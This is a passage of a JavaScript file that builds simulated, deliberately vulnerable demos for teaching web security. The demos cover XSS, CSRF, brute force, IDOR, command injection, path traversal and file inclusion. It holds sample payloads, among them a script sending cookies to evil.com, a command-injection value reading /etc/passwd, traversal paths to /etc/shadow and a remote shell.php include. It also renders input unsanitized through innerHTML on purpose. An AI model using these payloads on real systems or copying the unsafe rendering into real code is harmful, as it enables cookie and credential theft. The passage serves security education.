                userI.value = s.user;
                passI.value = s.pass;
                explanation.querySelector('.explanation-text').innerHTML = s.text;
                resultPanel.classList.add('hidden');
                status.className = 'demo-status';
            };
        });
    }

    /* -- XSS Demo -- */
    function demoXSS(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Cross-Site Scripting – Stored XSS</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Normal Comment</button>
                    <button class="demo-step-btn" data-step="2">2. XSS Attack</button>
                    <button class="demo-step-btn" data-step="3">3. Cookie Theft</button>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:2">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">https://social.example.com/post/12345</span>
                        </div>
                        <div class="browser-content demo-social">
                            <div class="demo-post">
                                <div class="demo-post-header"><strong>@alice</strong> <span class="demo-time">2h ago</span></div>
                                <p>Just finished the new security course! 🎉</p>
                            </div>
                            <div class="demo-comments" id="xssComments">
                                <div class="demo-comment"><strong>@bob:</strong> Congrats! 👏</div>
                            </div>
                            <div class="demo-comment-form">
                                <input class="demo-input" id="xssInput" placeholder="Add a comment…" style="flex:1">
                                <button class="demo-btn demo-btn-sm" id="xssPostBtn">Post</button>
                            </div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">🔍 Page Source / Console</div>
                        <div class="demo-sql-code" id="xssConsole"><pre>// Waiting for comment…</pre></div>
                    </div>
                </div>
                <div class="demo-explanation" id="xssExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1:</strong> Post a normal comment. The app renders it safely as text content.</p>
                    </div>
                </div>
            </div>`;

        const comments = $('#xssComments');
        const input = $('#xssInput');
        const consoleBox = $('#xssConsole');
        const explanationText = pane.querySelector('.explanation-text');

        const steps = {
            '1': { value: 'Great job Alice!', text: '<p><strong>Step 1:</strong> Normal comment – rendered as plain text. No issues here.</p>' },
            '2': { value: '<img src=x onerror="alert(\'XSS\')">', text: '<p><strong>Step 2:</strong> The attacker posts an HTML &lt;img&gt; tag with an onerror handler. Because the app uses innerHTML without sanitization, the browser executes the JavaScript.</p>' },
            '3': { value: '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>', text: '<p><strong>Step 3:</strong> A more dangerous payload sends the user\'s cookies to an attacker-controlled server. Every user who views this page becomes a victim.</p>' },
        };

        $('#xssPostBtn').onclick = () => {
            const val = input.value.trim();
            if (!val) return;
            const div = el('div', 'demo-comment');
            // simulate vulnerable render
            div.innerHTML = `<strong>@attacker:</strong> ${val}`;
            comments.appendChild(div);
            consoleBox.innerHTML = `<pre>// Rendered HTML:\n${esc(val)}\n\n// Injected into DOM via innerHTML\n// ⚠ No sanitization applied</pre>`;

            if (val.includes('<script>') || val.includes('onerror')) {
                const alert = el('div', 'demo-status show warning');
                alert.innerHTML = '⚠️ JavaScript executed in victim\'s browser!';
                comments.parentElement.appendChild(alert);
            }
            input.value = '';
        };

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const s = steps[b.dataset.step];
                input.value = s.value;
                explanationText.innerHTML = s.text;
            };
        });
    }

    /* -- CSRF Demo -- */
    function demoCSRF(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Cross-Site Request Forgery – Fund Transfer</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Victim's Session</button>
                    <button class="demo-step-btn" data-step="2">2. Malicious Page</button>
                    <button class="demo-step-btn" data-step="3">3. Attack Result</button>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url" id="csrfUrl">https://bank.example.com/dashboard</span>
                        </div>
                        <div class="browser-content" id="csrfContent">
                            <div class="demo-bank-ui">
                                <div class="bank-header"><span>🏦 SecureBank</span><span class="bank-user">Welcome, Alice</span></div>
                                <div class="bank-balance"><strong>Balance:</strong> $<span id="csrfBalance">5,000.00</span></div>
                                <div class="bank-actions">
                                    <button class="demo-btn demo-btn-sm" id="csrfTransferBtn">Transfer Funds</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">📡 HTTP Requests</div>
                        <div class="demo-sql-code" id="csrfLog"><pre>Session: authenticated as Alice\nCookie: session=abc123xyz</pre></div>
                    </div>
                </div>
                <div class="demo-explanation" id="csrfExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1:</strong> Alice is logged into her bank. Her browser has a valid session cookie.</p>
                    </div>
                </div>
            </div>`;

        const url = $('#csrfUrl'), contentArea = $('#csrfContent'), logBox = $('#csrfLog');
        const explanationText = pane.querySelector('.explanation-text');
        const balanceEl = $('#csrfBalance');

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const step = b.dataset.step;

                if (step === '1') {
                    url.textContent = 'https://bank.example.com/dashboard';
                    contentArea.innerHTML = `
                        <div class="demo-bank-ui">
                            <div class="bank-header"><span>🏦 SecureBank</span><span class="bank-user">Welcome, Alice</span></div>
                            <div class="bank-balance"><strong>Balance:</strong> $5,000.00</div>
                        </div>`;
                    logBox.innerHTML = `<pre>Session: authenticated as Alice\nCookie: session=abc123xyz</pre>`;
                    explanationText.innerHTML = '<p><strong>Step 1:</strong> Alice is logged into her bank. Her browser has a valid session cookie that\'s automatically sent with every request to bank.example.com.</p>';
                } else if (step === '2') {
                    url.textContent = 'https://evil.com/free-prize.html';
                    contentArea.innerHTML = `
                        <div style="padding:20px;text-align:center">
                            <h4>🎉 You Won a Free iPhone!</h4>
                            <p style="font-size:0.85rem;color:var(--text-muted);margin:8px 0">Click below to claim your prize</p>
                            <button class="demo-btn" id="csrfClaimBtn">Claim Prize</button>
                            <p style="font-size:0.7rem;color:var(--text-muted);margin-top:16px">Hidden in page source:</p>
                            <pre style="background:#1a202c;color:#e2e8f0;padding:10px;border-radius:6px;font-size:0.7rem;text-align:left;margin-top:4px">&lt;form action="bank.com/transfer" method="POST"&gt;
  &lt;input type="hidden" name="to" value="attacker"&gt;
  &lt;input type="hidden" name="amount" value="4999"&gt;
&lt;/form&gt;</pre>
                        </div>`;
                    logBox.innerHTML = `<pre>Browsing: evil.com/free-prize.html\n\n⚠ Page contains hidden form targeting bank.com\n⚠ Clicking will trigger auto-submit</pre>`;
                    explanationText.innerHTML = '<p><strong>Step 2:</strong> Alice visits a malicious page. It contains a hidden form that targets her bank. If she clicks anything (or via auto-submit), the browser sends the request WITH her bank cookies automatically attached.</p>';
                    const claimBtn = $('#csrfClaimBtn');
                    if (claimBtn) claimBtn.onclick = () => {
                        $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                        $$('.demo-step-btn')[2].classList.add('active');
                        showStep3();
                    };
                } else {
                    showStep3();
                }

                function showStep3() {
                    url.textContent = 'https://bank.example.com/dashboard';
                    contentArea.innerHTML = `
                        <div class="demo-bank-ui">
                            <div class="bank-header"><span>🏦 SecureBank</span><span class="bank-user">Welcome, Alice</span></div>
                            <div class="bank-balance" style="color:#e53e3e"><strong>Balance:</strong> $1.00</div>
                            <div class="demo-log" style="color:#e53e3e;font-size:0.8rem">
                                ⚠ Transaction: -$4,999.00 to account "attacker_account"<br>
                                Timestamp: ${new Date().toISOString()}
                            </div>
                        </div>`;
                    logBox.innerHTML = `<pre>POST /transfer HTTP/1.1
Host: bank.example.com
Cookie: session=abc123xyz  ← Auto-attached!
Content-Type: application/x-www-form-urlencoded

to=attacker_account&amount=4999

→ 200 OK: Transfer successful
→ Alice's balance: $1.00</pre>`;
                    explanationText.innerHTML = '<p><strong>Step 3 – Result:</strong> The transfer was executed using Alice\'s authenticated session. She never intended to make this transfer. The server couldn\'t distinguish this from a legitimate request because it had valid session cookies.</p>';
                }
            };
        });
    }

    /* -- Broken Auth Demo -- */
    function demoBrokenAuth(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Broken Authentication – Brute Force</span>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">https://app.example.com/login</span>
                        </div>
                        <div class="browser-content">
                            <div class="demo-login-form">
                                <h4>🔐 AppLogin</h4>
                                <p class="demo-subtitle">No rate limiting • No lockout</p>
                                <div class="demo-field"><label>Username</label><input class="demo-input" id="baUser" value="admin"></div>
                                <div class="demo-field"><label>Password</label><input class="demo-input" id="baPass" value=""></div>
                                <button class="demo-btn" style="width:100%;margin-top:8px" id="baBruteBtn">🔨 Start Brute Force</button>
                                <div class="demo-status" id="baStatus"></div>
                            </div>
                        </div>
                    </div>
                    <div class="demo-sql-panel">
                        <div class="panel-header">📡 Attack Log</div>
                        <div class="demo-sql-code" id="baLog" style="max-height:300px;overflow-y:auto"><pre>Ready to start brute force attack…</pre></div>
                    </div>
                </div>
                <div class="demo-explanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p>This demo simulates a brute-force attack against a login form with no rate limiting. The attacker tries common passwords until finding the correct one. Without account lockout or CAPTCHA, there's nothing to stop them.</p>
                    </div>
                </div>
            </div>`;

        const passwords = ['123456', 'password', 'admin', 'letmein', 'welcome', 'monkey', 'master', 'qwerty', 'admin123', 'P@ssw0rd!'];
        const log = $('#baLog');
        let running = false;

        $('#baBruteBtn').onclick = () => {
            if (running) return;
            running = true;
            log.innerHTML = '<pre>Starting brute force attack on user "admin"…\n</pre>';
            const pre = log.querySelector('pre');
            let i = 0;
            const interval = setInterval(() => {
                const pw = passwords[i];
                const isCorrect = i === passwords.length - 1;
                pre.textContent += `\nAttempt ${i + 1}: admin / ${pw} → ${isCorrect ? '✅ SUCCESS!' : '❌ Failed'}`;
                log.scrollTop = log.scrollHeight;

                if (isCorrect) {
                    clearInterval(interval);
                    running = false;
                    const status = $('#baStatus');
                    status.className = 'demo-status show warning';
                    status.innerHTML = `⚠️ Password cracked after ${i + 1} attempts: <strong>${pw}</strong>`;
                    $('#baPass').value = pw;
                    pre.textContent += `\n\n🔓 Account compromised!\nNo rate limiting detected.\nNo account lockout detected.\nNo CAPTCHA required.`;
                }
                i++;
            }, 400);
        };
    }

    /* -- IDOR Demo -- */
    function demoIDOR(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Insecure Direct Object Reference – Profile Access</span>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1.5">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url" id="idorUrl">https://api.example.com/users/1001/profile</span>
                        </div>
                        <div class="browser-content demo-api-explorer">
                            <div style="display:flex;gap:8px;margin-bottom:16px">
                                <span style="background:#48bb78;color:white;padding:4px 12px;border-radius:4px;font-size:0.75rem;font-weight:700">GET</span>
                                <input class="demo-input" id="idorInput" value="/api/users/1001/profile" style="flex:1;font-family:var(--font-mono);font-size:0.82rem">
                                <button class="demo-btn demo-btn-sm" id="idorSendBtn">Send</button>
                            </div>
                            <div id="idorProfile"></div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">📊 API Response</div>
                        <div class="demo-sql-code" id="idorResponse"><pre>// Send a request to see the response</pre></div>
                    </div>
                </div>
                <div class="demo-explanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p>Try changing the user ID in the URL from <code>1001</code> to <code>1002</code> or <code>1003</code>. The API doesn't verify that you're authorized to access other users' profiles – a classic IDOR vulnerability.</p>
                    </div>
                </div>
            </div>`;

        const profiles = {
            '1001': { name: 'You (John Doe)', email: 'john@example.com', role: 'User', ssn: '***-**-1234', avatar: '👤' },
            '1002': { name: 'Jane Smith (Admin)', email: 'jane@company.com', role: 'Administrator', ssn: '555-12-9876', avatar: '👩‍💼' },
            '1003': { name: 'Bob Wilson (CEO)', email: 'bob@company.com', role: 'Executive', ssn: '123-45-6789', avatar: '👨‍💼', salary: '$450,000' },
        };

        function render() {
            const path = $('#idorInput').value;
            const match = path.match(/\/users\/(\d+)/);
            const id = match ? match[1] : null;
            const p = id ? profiles[id] : null;
            const urlEl = $('#idorUrl');
            const profile = $('#idorProfile');
            const response = $('#idorResponse');

            urlEl.textContent = `https://api.example.com${path}`;

            if (!p) {
                response.innerHTML = `<pre>HTTP 404 Not Found\n{\n  "error": "User not found"\n}</pre>`;
                profile.innerHTML = '';
                return;
            }

            const isOwn = id === '1001';
            profile.innerHTML = `
                <div class="profile-card">
                    <div class="profile-avatar">${p.avatar}</div>
                    <h4>${p.name}</h4>
                    <div class="profile-detail">${p.role}</div>
                    <div class="profile-detail">${p.email}</div>
                    <div class="profile-detail">SSN: ${p.ssn}</div>
                    ${p.salary ? `<div class="profile-detail">Salary: ${p.salary}</div>` : ''}
                    ${!isOwn ? '<div class="demo-status show warning" style="margin-top:12px;font-size:0.78rem">⚠️ Accessing another user\'s private data!</div>' : ''}
                </div>`;

            response.innerHTML = `<pre>HTTP 200 OK ${!isOwn ? '← ⚠ No authorization check!' : ''}\n{\n  "id": ${id},\n  "name": "${p.name.split(' (')[0]}",\n  "email": "${p.email}",\n  "role": "${p.role}",\n  "ssn": "${p.ssn}"${p.salary ? `,\n  "salary": "${p.salary}"` : ''}\n}</pre>`;
        }

        $('#idorSendBtn').onclick = render;
        render();
    }

    /* -- Command Injection Demo -- */
    function demoCmdInjection(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Command Injection – Network Diagnostic Tool</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Normal Use</button>
                    <button class="demo-step-btn" data-step="2">2. Inject Command</button>
                    <button class="demo-step-btn" data-step="3">3. Read Files</button>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">https://tools.example.com/netdiag</span>
                        </div>
                        <div class="browser-content">
                            <h4 style="margin-bottom:4px">🌐 Network Diagnostic</h4>
                            <p class="demo-subtitle">Enter a hostname to ping</p>
                            <div style="display:flex;gap:8px">
                                <input class="demo-input" id="cmdiInput" value="8.8.8.8" style="flex:1;font-family:var(--font-mono)">
                                <button class="demo-btn" id="cmdiRunBtn">Run Ping</button>
                            </div>
                            <div class="cmdi-output" id="cmdiOutput"><pre>Results will appear here…</pre></div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">⚙️ Server-Side Execution</div>
                        <div class="demo-sql-code" id="cmdiServer"><pre>// Waiting…</pre></div>
                    </div>
                </div>
                <div class="demo-explanation" id="cmdiExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1:</strong> Normal usage – ping a hostname. The server runs <code>ping -c 4 &lt;input&gt;</code>.</p>
                    </div>
                </div>
            </div>`;

        const input = $('#cmdiInput'), output = $('#cmdiOutput'), server = $('#cmdiServer');
        const explanationText = pane.querySelector('.explanation-text');

        const responses = {
            '8.8.8.8': 'PING 8.8.8.8: 56 data bytes\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=117 time=12.3 ms\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=11.8 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=12.1 ms\n\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss',
        };

        function run() {
            const val = input.value;
            server.innerHTML = `<pre>// Server-side code (vulnerable):\nString cmd = "ping -c 4 " + userInput;\nRuntime.exec(cmd);\n\n// Actual command executed:\n$ ping -c 4 ${esc(val)}</pre>`;

            if (responses[val]) {
                output.innerHTML = `<pre>${responses[val]}</pre>`;
            } else if (val.includes(';') || val.includes('|') || val.includes('&&')) {
                const parts = val.split(/[;|&]+/).map((s) => s.trim());
                let out = '';
                parts.forEach((p) => {
                    if (p.match(/^[\d.]+$/)) out += `PING ${p}: 64 bytes, ttl=117, time=12ms\n`;
                    else if (p.includes('whoami')) out += 'www-data\n';
                    else if (p.includes('id')) out += 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n';
                    else if (p.includes('cat /etc/passwd')) out += 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\n';
                    else if (p.includes('ls')) out += 'index.php\nconfig.php\nuploads/\ndb_backup.sql\n';
                    else out += `${p}: command output\n`;
                });
                output.innerHTML = `<pre>${esc(out)}</pre>`;
            } else {
                output.innerHTML = `<pre>PING ${esc(val)}: 56 data bytes\n64 bytes: icmp_seq=0 ttl=117 time=15.2 ms\n3 packets transmitted, 3 received</pre>`;
            }
        }

        $('#cmdiRunBtn').onclick = run;

        const steps = {
            '1': { val: '8.8.8.8', text: '<p><strong>Step 1:</strong> Normal usage – the tool pings a valid IP address. The command executes safely.</p>' },
            '2': { val: '8.8.8.8; whoami; id', text: '<p><strong>Step 2:</strong> By adding <code>;</code> after the IP address, the attacker chains additional commands. The server reveals the running user and permissions.</p>' },
            '3': { val: '8.8.8.8; cat /etc/passwd', text: '<p><strong>Step 3:</strong> The attacker reads sensitive system files. With command injection, they have full shell access on the server.</p>' },
        };

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const s = steps[b.dataset.step];
                input.value = s.val;
                explanationText.innerHTML = s.text;
            };
        });
    }

    /* -- Path Traversal Demo -- */
    function demoPathTraversal(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Path Traversal – File Access</span>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1.5">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url" id="pathUrl">https://docs.example.com/view?file=report.pdf</span>
                        </div>
                        <div class="browser-content">
                            <h4 style="margin-bottom:8px">📁 Document Viewer</h4>
                            <div style="display:flex;gap:8px;margin-bottom:12px">
                                <input class="demo-input" id="pathInput" value="report.pdf" style="flex:1;font-family:var(--font-mono)">
                                <button class="demo-btn demo-btn-sm" id="pathFetchBtn">View File</button>
                            </div>
                            <div class="file-list" style="margin-bottom:12px">
                                <div class="file-item" data-f="report.pdf">📄 report.pdf</div>
                                <div class="file-item" data-f="invoice.pdf">📄 invoice.pdf</div>
                                <div class="file-item" data-f="../../../etc/passwd">🔓 ../../../etc/passwd</div>
                                <div class="file-item" data-f="../../../etc/shadow">🔓 ../../../etc/shadow</div>
                                <div class="file-item" data-f="../../config/database.yml">🔓 ../../config/database.yml</div>
                            </div>
                            <div id="pathContent" style="background:#f7fafc;border-radius:6px;padding:14px;font-family:var(--font-mono);font-size:0.8rem;min-height:80px;white-space:pre-wrap"></div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">⚙️ Server Processing</div>
                        <div class="demo-sql-code" id="pathServer"><pre>// Click a file to view</pre></div>
                    </div>
                </div>
                <div class="demo-explanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p>The server reads files using <code>basePath + userInput</code> without validating the path. By using <code>../</code> sequences, an attacker can escape the document directory and read any file the web server can access.</p>
                    </div>
                </div>
            </div>`;

        const files = {
            'report.pdf': 'ANNUAL REPORT 2024\n==================\nRevenue: $12.5M\nEmployees: 150\nCustomer Satisfaction: 94%',
            'invoice.pdf': 'INVOICE #10234\n==============\nClient: ACME Corp\nAmount: $5,200.00\nDue: 2024-02-01',
            '../../../etc/passwd': '⚠️ SENSITIVE FILE ACCESSED!\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\npostgres:x:26:26:PostgreSQL:/var/lib/pgsql:/bin/bash',
            '../../../etc/shadow': '⚠️ CRITICAL FILE!\n\nroot:$6$xyz$hashhashhash...:19000:0:99999:7:::\nwww-data:!:19000:0:99999:7:::',
            '../../config/database.yml': '⚠️ DATABASE CREDENTIALS!\n\nproduction:\n  adapter: mysql2\n  host: db.internal\n  database: production_db\n  username: prod_admin\n  password: Sup3rS3cr3t!@#',
        };

        function load(f) {
            $('#pathInput').value = f;
            $('#pathUrl').textContent = `https://docs.example.com/view?file=${f}`;
            $('#pathContent').textContent = files[f] || 'File not found.';
            const isMalicious = f.includes('..');
            $('#pathServer').innerHTML = `<pre>// Server code (vulnerable):\nString path = "/var/www/docs/" + request.getParam("file");\n\n// Resolved path:\n${isMalicious ? '⚠ ' : ''}${f.includes('..') ? '/var/www/docs/' + f + '\n→ Resolves to: ' + f.replace(/\.\.\//g, '').replace(/^/, '/') : '/var/www/docs/' + f}\n\n${isMalicious ? '⚠ PATH TRAVERSAL DETECTED!\nAttacker escaped the /var/www/docs/ directory!' : '✅ Normal file access within allowed directory'}</pre>`;
        }

        $$('.file-item').forEach((fi) => fi.onclick = () => load(fi.dataset.f));
        $('#pathFetchBtn').onclick = () => load($('#pathInput').value);
        load('report.pdf');
    }

    /* -- Security Misconfiguration Demo -- */
    function demoMisconfig(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-warning">⚠ CHECK</span>
                    <span class="demo-title">Security Misconfiguration Scanner</span>
                </div>
                <div class="demo-visual" style="flex-direction:column">
                    <div class="demo-browser" style="width:100%">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">Security Configuration Audit</span>
                        </div>
                        <div class="browser-content">
                            <div style="display:flex;gap:8px;margin-bottom:16px">
                                <input class="demo-input" id="misconfigUrl" value="https://vulnerable-app.example.com" style="flex:1">
                                <button class="demo-btn" id="misconfigScanBtn">🔍 Run Scan</button>
                            </div>
                            <div class="misconfig-checks" id="misconfigResults"></div>
                        </div>
                    </div>
                </div>
                <div class="demo-explanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p>This scanner checks for common security misconfigurations. Red items are vulnerabilities that could be exploited. Click "Run Scan" to see the results.</p>
                    </div>
                </div>
            </div>`;

        const checks = [
            { name: 'HTTPS Enforcement', pass: true, detail: 'HSTS header present' },
            { name: 'Default Credentials', pass: false, detail: 'admin/admin works on /admin panel!' },
            { name: 'Directory Listing', pass: false, detail: '/uploads/ directory is browsable' },
            { name: 'Server Version Header', pass: false, detail: 'Server: Apache/2.4.49 (known vulnerabilities)' },
            { name: 'Error Messages', pass: false, detail: 'Stack traces visible: java.sql.SQLException at…' },
            { name: 'X-Frame-Options', pass: false, detail: 'Missing – vulnerable to clickjacking' },
            { name: 'Content-Security-Policy', pass: false, detail: 'Missing – vulnerable to XSS' },
            { name: 'X-Content-Type-Options', pass: true, detail: 'nosniff set correctly' },
            { name: 'Debug Mode', pass: false, detail: '/debug/console is accessible!' },
            { name: 'Backup Files', pass: false, detail: 'Found: /config.php.bak, /db_backup.sql' },
        ];

        $('#misconfigScanBtn').onclick = () => {
            const results = $('#misconfigResults');
            results.innerHTML = '';
            let i = 0;
            const interval = setInterval(() => {
                if (i >= checks.length) { clearInterval(interval); return; }
                const c = checks[i];
                const div = el('div', `check-item ${c.pass ? 'pass' : 'fail'}`);
                div.innerHTML = `<span class="check-icon">${c.pass ? '✅' : '❌'}</span><span style="flex:1"><strong>${c.name}</strong><br><span style="font-size:0.78rem;color:var(--text-muted)">${c.detail}</span></span>`;
                div.style.animation = 'fadeIn 0.3s ease';
                results.appendChild(div);
                i++;
            }, 300);
        };
    }

    /* ============================================================
       FILE INCLUSION DEMO
       ============================================================ */
    function demoFileInclusion(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">File Inclusion – LFI & RFI</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Normal Include</button>
                    <button class="demo-step-btn" data-step="2">2. Local File Inclusion</button>
                    <button class="demo-step-btn" data-step="3">3. Remote File Inclusion</button>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1.3">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url" id="fiUrl">https://app.example.com/view?page=about.php</span>
                        </div>
                        <div class="browser-content">
                            <h4 style="margin-bottom:8px">📄 Page Viewer</h4>
                            <div style="display:flex;gap:8px;margin-bottom:12px">
                                <span style="background:#edf2f7;padding:6px 10px;border-radius:4px;font-size:0.75rem;color:var(--text-muted);white-space:nowrap">?page=</span>
                                <input class="demo-input" id="fiInput" value="about.php" style="flex:1;font-family:var(--font-mono);font-size:0.82rem">
                                <button class="demo-btn demo-btn-sm" id="fiLoadBtn">Load</button>
                            </div>
                            <div id="fiPageContent" style="background:#f7fafc;border-radius:6px;padding:16px;font-size:0.85rem;min-height:120px;white-space:pre-wrap;line-height:1.6"></div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">⚙️ Server-Side Code</div>
                        <div class="demo-sql-code" id="fiServer"><pre>// PHP include (vulnerable):
include($_GET['page']);

// Loaded: about.php
// ✅ Normal — within allowed directory</pre></div>
                    </div>
                </div>
                <div class="demo-explanation" id="fiExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1:</strong> Normal page load. The application includes a local PHP file as expected.</p>
                    </div>
                </div>
            </div>`;

        const pages = {
            'about.php': '<h4>About Us</h4><p>Welcome to our application. We provide secure services for our customers.</p><p>Founded in 2020. Trusted by thousands.</p>',
            'contact.php': '<h4>Contact</h4><p>Email: info@example.com</p><p>Phone: +1-555-0123</p>',
            '../../../../etc/passwd': '⚠️ SENSITIVE FILE ACCESSED!\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false\npostgres:x:26:26:PostgreSQL:/var/lib/pgsql:/bin/bash\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin',
            '../../../../var/log/apache2/access.log': '⚠️ WEB SERVER LOG ACCESSED!\n\n192.168.1.100 - - [01/Jan/2025:10:00:00] "GET /admin HTTP/1.1" 200 1234\n192.168.1.105 - - [01/Jan/2025:10:01:15] "POST /login HTTP/1.1" 302 0\n10.0.0.50 - admin [01/Jan/2025:10:02:30] "GET /config.php HTTP/1.1" 200 567\n\n⚠ Log poisoning possible: inject PHP code via User-Agent header!',
            'https://evil.com/shell.php': '⚠️ REMOTE CODE EXECUTION!\n\n[evil.com/shell.php loaded and executed!]\n\n$ whoami\nwww-data\n\n$ id\nuid=33(www-data) gid=33(www-data)\n\n$ cat /var/www/config.php\ndb_host = "localhost"\ndb_user = "admin"\ndb_pass = "S3cr3tP@ss!"',
        };

        const input = $('#fiInput');
        const pageContent = $('#fiPageContent');
        const server = $('#fiServer');
        const urlBar = $('#fiUrl');
        const explanationText = pane.querySelector('.explanation-text');

        function loadPage(val) {
            urlBar.textContent = `https://app.example.com/view?page=${val}`;
            const isTraversal = val.includes('..');
            const isRemote = val.startsWith('http');
            const content = pages[val];

            if (content) {
                pageContent.innerHTML = content;
            } else {
                pageContent.textContent = isRemote ? '⚠️ Remote file inclusion attempted!' : isTraversal ? '⚠️ Local file inclusion attempted!' : 'Page not found.';
            }

            if (isRemote) {
                server.innerHTML = `<pre>// PHP include (vulnerable):
include($_GET['page']);

// Loaded: ${esc(val)}
// ⚠ REMOTE FILE INCLUSION!
// The server fetched and EXECUTED
// code from an external server!
//
// allow_url_include = On (dangerous!)
// Attacker has full code execution!</pre>`;
            } else if (isTraversal) {
                server.innerHTML = `<pre>// PHP include (vulnerable):
include($_GET['page']);

// Requested: ${esc(val)}
// Resolved: /var/www/html/${esc(val)}
// → ${val.replace(/\.\.\//g, '').replace(/^/, '/')}
//
// ⚠ LOCAL FILE INCLUSION!
// Attacker escaped /var/www/html/
// and accessed system files!</pre>`;
            } else {
                server.innerHTML = `<pre>// PHP include (vulnerable):
include($_GET['page']);

// Loaded: ${esc(val)}
// ✅ Normal — within allowed directory</pre>`;
            }
        }

        pageContent.innerHTML = pages['about.php'];
        $('#fiLoadBtn').onclick = () => loadPage(input.value);

        const steps = {
            '1': { val: 'about.php', text: '<p><strong>Step 1:</strong> Normal page inclusion. The application loads a legitimate local file.</p>' },
